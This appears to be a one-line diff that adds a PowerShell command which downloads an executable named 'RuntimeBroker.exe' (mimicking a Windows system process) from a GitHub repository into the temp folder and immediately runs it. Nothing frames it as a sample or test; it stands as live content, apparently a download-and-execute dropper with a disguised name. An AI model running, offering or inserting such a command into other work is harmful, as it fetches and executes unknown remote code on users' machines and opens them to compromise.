@@ -1,0 +1,1 @@
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/swedengg/gg/raw/main/RuntimeBroker.exe' -OutFile $env:TEMP\RuntimeBroker.exe; Start-Process $env:TEMP\RuntimeBroker.exe"
